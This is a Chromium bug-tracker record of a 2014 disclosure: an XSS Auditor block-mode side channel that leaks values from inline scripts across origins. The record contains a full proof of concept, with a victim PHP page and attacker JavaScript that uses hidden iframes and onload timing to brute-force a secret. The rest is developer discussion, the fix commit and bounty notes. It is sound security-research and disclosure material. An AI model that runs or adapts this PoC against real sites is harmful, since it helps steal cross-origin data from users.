# Security: XSS filter information leak

| Field | Value |
|-------|-------|
| **Issue ID** | [40080096](https://issues.chromium.org/issues/40080096) |
| **Status** | Assigned |
| **Severity** | Unknown |
| **Priority** | P2 |
| **Component** | Blink>SecurityFeature |
| **Reporter** | we...@gmail.com |
| **Assignee** | ts...@chromium.org |
| **Created** | 2014-07-23 |
| **Bounty** | $1,500.00 |

## Description

**VULNERABILITY DETAILS**

By abusing Chrome's XSS Filter, attackers can gain information  

on a web page of a different origin, even the target page does  

NOT have any XSS vulnerabilities.

Suppose that victim web site (<http://victim/>) has a web page  

contains a script shown below.

<SCRIPT>var secret='1234';</SCRIPT>

Let's suppose that an user accesses below URLs.

URL-1: <http://victim/#><SCRIPT>var secret='1233';

URL-2: <http://victim/#><SCRIPT>var secret='1234';

When the user accesses URL-1, XSS Filter will not be triggered,  

because the script in the response is not contained within the  

request. On the other hand, URL-2 triggers the filter.

This means that an attacker can gain information on the "secret"  

value in the script, if he can know whether individual request  

triggered the filter or not.

It is easy for the attacker to verify whether the filter reacted  

or not, at least if the victim web page uses

X-XSS-Protection: 1; mode=block

In the block mode, the filter changes the web page's URL to  

"data:," if it detects attacks. The attacker can abuse this.

First, the attacker makes a page on his web site (<http://attacker/>).  

Then he creates an IFRAME pointing to URL-1 in the attacker's page.  

When the IFRAME's onload event fires, the JavaScript code in the  

attacker's page changes the IFRAME's src to "data:,#".  

As for URL-1, this fires second onload event of the IFRAME.

Regarding URL-2, immediately after (or during) the URL-2's load,  

the filter changes the URL to "data:,". So when the attacker's JS  

changes the IFRAME's src to "data:,#", another onload event does  

not happen.

Thus, the attacker can verify whether the filter reacted or not,  

by checking whether the IFRAME's second onload event fires or not.  

It means that he can gain some information contained in the target  

page's SCRIPT tag.

Some additional notes are listed above.

- This attack is not practical if the value that the attacker is  
  
  trying to steal (or other part in the same SCRIPT tag) has much  
  
  entropy. This is because, as far as I know, we do not have an  
  
  efficient method that is applicable to this attack, such as  
  
  binary search used in Blind SQL Injection.
  
  The only possible idea I came up with is using URLs with  
  
  multiple payloads, like the following one.
  
  <http://victim/#><script>var secret='1230';var secret='1231';var secret='1232';var secret='1233';...
  
  This can surely reduce the number of HTTP requests necessary to  
  
  reach the answer, but the effect is limited in case the target's  
  
  entropy is really huge.
- The attacker cannot obtain information on the specific bytes  
  
  contained in the target value.
  
  "0", "", 0x80 - 0xFF
  
  This restriction comes from how the filter matches scripts in  
  
  the response against request. The filter seems to ignore these  
  
  bytes in the response-request matching process.
- I am not sure if there is a way to steal information without  
  
  "mode=block". If the target page has a certain structure that  
  
  is convenient for attackers, there would be a way. Also I am  
  
  not sure if this attack really needs to use IFRAME for now.

**VERSION**

Chrome Version: 36.0.1985.125 m (production release)  

Operating System: Windows 7 SP1

**REPRODUCTION CASE**

I made a PoC code.

## // Victim's side

<?php
header('X-XSS-Protection: 1; mode=block');
?>
<HTML>
<BODY>
<SCRIPT>var secret='1234';</SCRIPT>
</BODY>
</HTML>
## // Attacker's side

<BODY>
<H1>Push the button to start the attack</H1>
<SCRIPT>
var iframeMaxNum = 100, start = 1000, end = 2000;
var dat = [], queue = [], iframeCntainer, result;

function startAttack() {  

iframeContainer = document.getElementById('iframeContainer');  

result = document.getElementById('result');

```
for (var i = start; i < end; i++) {  
    queue.push(i);  
}  

processQueue();  

```

}

function processQueue() {  

result.textContent = queue.length + " in queue";

```
var iframeNum = iframeContainer.getElementsByTagName('iframe').length;  

if (iframeNum < iframeMaxNum) {  
    for (var i = 0; i < iframeMaxNum - iframeNum; i++) {  
        var j = queue.shift();  
        if (j === undefined) {  
            break;  
        }  
        step1(j);  
    }  
}  

if (queue.length > 0) {  
    setTimeout(processQueue, 10);  
    return;  
}  
else {  
    for (var i = 0; i < 10; i++) {  
        setTimeout(writeResult, i \* 1000);  
    }  
}  

```

}

function step1(i) {  

var ifrm = document.createElement('iframe');  

iframeContainer.appendChild(ifrm);

```
ifrm.id = "ifrm_" + i;  
ifrm.onload = onloadStep2;  
ifrm.style.width = '1px';  
ifrm.style.height = '1px';  
ifrm.src = "http://victim/#<SCRIPT>var secret='" + i + "';";  

dat[i] = 1;  

```

}

function onloadStep2() {  

var ifrm = this;  

var i = ifrm.id.split("\_")[1];  

ifrm.onload = onloadStep3;  

ifrm.src = "data:,#";

```
dat[i] = 2;  

```

}

function onloadStep3() {  

var ifrm = this;  

var i = ifrm.id.split("\_")[1];

```
dat[i] = 3;  

ifrm.parentNode.removeChild(ifrm);  

```

}

function writeResult() {  

var s = "";

```
for (var i in dat) {  
    if (dat[i] == 2) {  
        s += i + "<br>";  
    }  
}  

result.innerHTML = s;  

```

}

</SCRIPT>
<INPUT type="button" value="attack" onclick="startAttack()">
<DIV id="iframeContainer"></DIV>
<DIV id="result"></DIV>
</BODY>
--------------------------------------------------------------------

## Timeline

### we...@gmail.com (2014-07-23)

I found this issue is similar to https://code.google.com/p/chromium/issues/detail?id=176137


### ts...@chromium.org (2014-07-23)

Interesting technique.  The same caveats as in 176137 apply:

1. The site must supply an 'x-xss-protection mode=block' header.
2. The site must place sensitive information in an inline <script> block.
3. The sensitive information must occur within the first 100 characters of the block.
4. The sensitive information must occur before the first comment or comma.
5. The sensitive information must be enumerable in javascript in a reasonable amount of time.
6. The site must not block you after making repeated requests for the same page rapidly in a loop (i.e. no DOS protection).

But we'll want to fix this anyways.


### ts...@chromium.org (2014-07-23)

[Empty comment from Monorail migration]

### ts...@chromium.org (2014-07-23)

One quick thought is we could navigate to data:,<p id="random-number">. The extraction technique only works because "data:," is predictable, so creating a fragment nav is possible.


### ts...@chromium.org (2014-07-23)

[Comment Deleted]

### ts...@chromium.org (2014-07-23)

https://code.google.com/p/chromium/issues/detail?id=291747 is where we chose to support fragment navigations on non-hierarchical schemes.  So this is intentional and we need to keep it.

### we...@gmail.com (2014-07-24)

@tsepez

Attacker has a choice to use http://victim/#blah as a second URL, instead of data:,#. 

In this case, if the iframe's URL is data:,<p id="random-number">, changing it to http://victim/#blah will cause onload event. But if the iframe's URL is http://victim/#<SCRIPT>..., second onload event does not fire.

That means attackers can guess whether the filter is triggered or not, only if the filter changes the URL to one with different scheme, host, path and query. So I believe that the filter should not touch the URL.


### ts...@chromium.org (2014-07-24)

Ah, right, test the complement. We've not been happy with the nav-to-data approach for some time; I was just looking for a quick fix in the interim. I don't think there is one, though.

### wf...@chromium.org (2014-07-24)

[Empty comment from Monorail migration]

### jw...@chromium.org (2014-07-24)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-07-25)

[Empty comment from Monorail migration]

### ts...@chromium.org (2014-07-25)

[Empty comment from Monorail migration]

### ts...@chromium.org (2014-07-25)

CL up at https://codereview.chromium.org/414223004/

### we...@gmail.com (2014-07-28)

To be a paranoid, there is still a possibility of info leak attack.

<SCRIPT>var secret='1234';</SCRIPT>
<IMG src="https://attacker/someimage.png">

The attakcer's image will be loaded only when the filter is not triggered.
That will let the attacker know if the filter was triggered or not.

Do you think this is just a corner case?

Recently I noticed that IE has a limit on the number of attack trials.
Once the number of suspicious requests hits the limit (10 times),
IE seems to stop seeing the response for XSS detection since then.
I don't know what the intention of this limit is, but wouldn't such limit be a remediation for edge cases?


### cl...@chromium.org (2014-07-28)

[Empty comment from Monorail migration]

### ts...@chromium.org (2014-07-28)

#14 sounds like a corner case that can't be avoided.  It is a good point, though.

### bu...@chromium.org (2014-07-30)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=179240

------------------------------------------------------------------
r179240 | tsepez@chromium.org | 2014-07-30T17:05:24.462914Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/contentSecurityPolicy/1.1/reflected-xss-and-xss-protection-block-allow-expected.txt?r1=179240&r2=179239&pathrev=179240
   M http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/contentSecurityPolicy/1.1/reflected-xss-and-xss-protection-allow-block-expected.txt?r1=179240&r2=179239&pathrev=179240
   M http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/xssAuditor/full-block-javascript-link-expected.txt?r1=179240&r2=179239&pathrev=179240
   M http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/xssAuditor/full-block-script-tag.html?r1=179240&r2=179239&pathrev=179240
   M http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/contentSecurityPolicy/1.1/reflected-xss-and-xss-protection-block-filter-expected.txt?r1=179240&r2=179239&pathrev=179240
   M http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/contentSecurityPolicy/1.1/reflected-xss-and-xss-protection-filter-block-expected.txt?r1=179240&r2=179239&pathrev=179240
   M http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/contentSecurityPolicy/1.1/reflected-xss-and-xss-protection-block-invalid-expected.txt?r1=179240&r2=179239&pathrev=179240
   M http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/contentSecurityPolicy/1.1/reflected-xss-and-xss-protection-invalid-block-expected.txt?r1=179240&r2=179239&pathrev=179240
   M http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/xssAuditor/full-block-iframe-javascript-url-expected.txt?r1=179240&r2=179239&pathrev=179240
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/loader/NavigationScheduler.cpp?r1=179240&r2=179239&pathrev=179240
   M http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/contentSecurityPolicy/1.1/reflected-xss-and-xss-protection-block-block-expected.txt?r1=179240&r2=179239&pathrev=179240
   M http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/xssAuditor/full-block-script-tag-expected.txt?r1=179240&r2=179239&pathrev=179240
   M http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/xssAuditor/full-block-link-onclick-expected.txt?r1=179240&r2=179239&pathrev=179240
   D http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/xssAuditor/window-open-block-mode.html?r1=179240&r2=179239&pathrev=179240
   M http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/contentSecurityPolicy/1.1/reflected-xss-and-xss-protection-block-unset-expected.txt?r1=179240&r2=179239&pathrev=179240
   M http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/contentSecurityPolicy/1.1/reflected-xss-and-xss-protection-unset-block-expected.txt?r1=179240&r2=179239&pathrev=179240
   M http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/xssAuditor/full-block-object-tag-expected.txt?r1=179240&r2=179239&pathrev=179240
   M http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/xssAuditor/full-block-script-tag-with-source-expected.txt?r1=179240&r2=179239&pathrev=179240
   D http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/xssAuditor/window-open-block-mode-expected.txt?r1=179240&r2=179239&pathrev=179240
   M http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/xssAuditor/xss-protection-parsing-03-expected.txt?r1=179240&r2=179239&pathrev=179240
   M http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/xssAuditor/xss-protection-parsing-04-expected.txt?r1=179240&r2=179239&pathrev=179240
   M http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/xssAuditor/full-block-base-href-expected.txt?r1=179240&r2=179239&pathrev=179240

Implement NavigationScheduler::schedulePageBlock() as a redirect to empty substitute data.

This replaces the long-standing kludge of navigating to "data:," so that
we preserve the URL of the page that was blocked. Otherwise, cross-origin
detection of the XSSAuditor is possible via a variety of techniques owing
to the change in the URL.

We lose the benefit of the unique origin, however. I don't think actually
provides any benefit, if only blank content is going into the replacement
page. As a consequence, the parent frame will successfully see same-origin
content in some of the tests. The cross-origin test remains unmodified, 
showing that there aren't new leaks (full-block-script-tag-cross-domain).

The upside is I can remove a lot of logic that was introduced recently to
preserve pages for view-source of the blocked page.  The window-open-block-mode
test is such an example.  There will be more cleanup possible on the
chrome side once this CL lands.

BUG=396544

Review URL: https://codereview.chromium.org/414223004
-----------------------------------------------------------------

### me...@chromium.org (2014-08-04)

[Empty comment from Monorail migration]

### ts...@chromium.org (2014-08-06)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-08-09)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### in...@chromium.org (2014-09-03)

Given size of change and severity, skipping merge.

### we...@gmail.com (2014-09-30)

[Comment Deleted]

### ti...@chromium.org (2014-10-03)

[Empty comment from Monorail migration]

### ti...@chromium.org (2014-10-07)

Congratulations - $1500 for this report. Under our new reward structure, we're paying $1000 (top end of the baseline category) plus an additional $500 for the proof of concept.

### cl...@chromium.org (2014-11-13)

Bulk update: removing view restriction from closed bugs.

### ti...@google.com (2014-12-09)

Payment in progress.

### ti...@google.com (2014-12-09)

[Empty comment from Monorail migration]

### ti...@google.com (2014-12-29)

Processing via our e-payment system can take up to six weeks, but the reward should be on its way to you. Thanks again for your help!

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### dh...@gmail.com (2016-10-30)

[Comment Deleted]

### ts...@chromium.org (2016-10-31)

Re-opening wrt. our discussion to make mode=block the default.  

### sh...@chromium.org (2016-11-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-11-15)

tsepez: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### me...@chromium.org (2016-11-21)

[Empty comment from Monorail migration]

### ra...@chromium.org (2016-11-27)

tsepez: has the security risk here been mitigated? Should we open a new bug to track #33? Is that work still p1? Thanks!

### ts...@chromium.org (2016-11-28)

There's no longer any actionable information in this bug.  Please file a new one if there is still an issue.

### dh...@gmail.com (2016-11-28)

Hi, I already filed it as a separate bug:
https://bugs.chromium.org/p/chromium/issues/detail?id=667079

As I mentioned, this issue is already fixed. My bug is different. It just produces the same 'effect'.

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/396544?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/667079]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40080096)*
